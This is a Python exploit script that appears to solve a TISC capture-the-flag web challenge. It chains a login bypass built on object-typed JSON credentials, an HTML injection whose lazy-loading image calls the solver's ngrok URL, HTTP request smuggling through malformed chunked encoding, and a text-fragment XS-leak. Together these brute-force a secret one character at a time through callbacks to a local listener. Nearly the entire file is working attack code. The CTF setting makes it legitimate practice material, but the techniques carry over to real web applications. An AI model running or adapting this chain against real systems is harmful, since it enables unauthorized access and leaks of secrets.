import socket
import time
import threading
import requests

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading

CHALLENGE_HOST = 'chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg'    # Change this
CHALLENGE_PORT = 23627                                              # Change this

# Change this - this is our URL that proxies to our local port 1337
OUR_URL = 'https://c61b-49-245-33-142.ngrok.io'

# Part 1: SQL Injection

s = requests.Session()
s.post(
    f'http://{CHALLENGE_HOST}:{CHALLENGE_PORT}/login',
    json={
        "email": {
            "email": 1
        },
        "password": {
            "password": 1
        }
    }
)

# Part 2 - Generate the Exploit Page

payload = f'<div class="min-vh-100">Min-height 100vh</div><div class="min-vh-100">Min-height 100vh</div><div class="min-vh-100">Min-height 100vh</div><img loading=lazy src="{OUR_URL}">'
r = s.post(
    f'http://{CHALLENGE_HOST}:{CHALLENGE_PORT}/token',
    json={
        'username': payload
    }
)

EXPLOIT_TOKEN = r.json()['token']
SESSID = r.cookies['connect.sid']

# Part 3 - Perform HTTP Request Smuggling + STTF XS-Leak

found = False


class Handler(BaseHTTPRequestHandler):

    def do_GET(self):
        global found
        found = True

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello world\t' + threading.current_thread().name.encode() + b'\t' + str(threading.active_count()).encode() + b'\n')


class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass


def run():
    global found

    server = ThreadingSimpleServer(('0.0.0.0', 1337), Handler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()

    ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz'
    current = 'TISC{'

    while True:
        i = 0
        while not found and i < len(ALPHABET):

            tmp = current + ALPHABET[i]
            print(f"Trying {tmp}")

            body = b'{"url":"http://localhost:8000/verify?token=' + \
                EXPLOIT_TOKEN.encode() + b'#:~:text=' + tmp.encode() + b'"}'

            smuggled = (
                b"POST /do-report HTTP/1.1\r\n" +
                b"Host: localhost\r\n" +
                b'Content-Length: ' + str(len(body)).encode() + b"\r\n" +
                b'Cookie: connect.sid=' + SESSID.encode() + b'\r\n' +
                b"Content-Type: application/json\r\n" +
                b'\r\n' +
                body + b"\r\n" +
                b"0\r\n" +
                b"\r\n"
            )

            def h(n):
                return hex(n)[2:].encode()

            smuggled_len = h(len(smuggled) - 7 + 5)

            first_chunk_len = h(len(smuggled_len))

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((CHALLENGE_HOST, CHALLENGE_PORT))

            sock.send(
                b"GET /index HTTP/1.1\r\n" +
                b"Host: localhost\r\n" +
                b"Transfer-Encoding: chunked\r\n" +
                b"\r\n" +
                first_chunk_len + b" \n" + b"x"*len(smuggled_len) + b"\r\n" +
                smuggled_len + b"\r\n" +
                b"0\r\n" +
                b"\r\n" +
                smuggled
            )

            i += 1

            time.sleep(10)

        found = False

        if i != len(ALPHABET):
            current += ALPHABET[i - 1] + ':'
            print(f'Found: {current}')

        else:
            print('No more characters')
            break

    server.shutdown()
    print(f'Flag: {current[:-1] + "}"}')


if __name__ == '__main__':
    run()
